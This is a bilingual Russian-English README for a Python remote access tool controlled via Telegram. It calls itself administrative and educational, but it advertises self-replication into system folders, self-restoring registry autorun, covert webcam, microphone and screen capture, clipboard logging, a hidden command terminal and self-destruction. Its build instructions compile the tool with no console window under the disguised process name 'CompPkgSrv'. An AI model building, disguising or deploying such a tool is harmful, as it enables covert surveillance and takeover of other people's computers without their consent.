# Krosover Remote Tool v15.0 (Ultimate Edition) 🚀

[RU] Административный инструмент для удаленного управления ПК через Telegram. 
[EN] Administrative tool for remote PC management via Telegram.

## 🇷🇺 Описание (Russian)
Мощный инструмент на базе Python для удаленного мониторинга и администрирования. 
Создан для учебных целей и тестирования систем на живучесть.

### Основные функции:
- 🛡 **Живучесть:** Автоматическое размножение в 3 системные папки и восстановление автозагрузки в реестре.
- 📸 **Мониторинг:** Скриншоты экрана, фото с веб-камеры, запись видео (30 сек) и аудио с микрофона.
- 📋 **Логгер:** Отслеживание буфера обмена в реальном времени.
- 💻 **Скрытый Терминал:** Выполнение CMD команд через символ `>`.
- 🎭 **Троллинг:** Голосовой диктор, открытие ссылок, перемещение мыши, смена обоев.
- 🛑 **Управление:** Дистанционная перезагрузка/выключение ПК и полный протокол самоуничтожения.

### Инструкция по сборке:
1. Установите Python и библиотеки: `pip install -r requirements.txt`
2. Вставьте свой `TOKEN` и `MY_ID` в код `main.py`.
3. Соберите проект в папку (рекомендуется для стабильности):
   `pyinstaller --noconsole --onedir --name "CompPkgSrv" main.py`

## 🇺🇸 Description (English)
A powerful Python-based tool for remote monitoring and administration.
Created for educational purposes and system persistence testing.

### Key Features:
- 🛡 **Persistence:** Auto-replication into 3 system folders and self-restoring registry autorun keys.
- 📸 **Monitoring:** Screen captures, webcam photos, video recording (30s), and microphone recording.
- 📋 **Logger:** Real-time clipboard monitoring.
- 💻 **Hidden Terminal:** Execute CMD commands using the `>` prefix.
- 🎭 **Trolling:** Voice synthesis, opening URLs, mouse movement, wallpaper changing.
- 🛑 **Management:** Remote Reboot/Shutdown and a full self-destruction protocol.

### Build Instructions:
1. Install Python and requirements: `pip install -r requirements.txt`
2. Insert your `TOKEN` and `MY_ID` into `main.py`.
3. Build into a directory (recommended for stability):
   `pyinstaller --noconsole --onedir --name "CompPkgSrv" main.py`
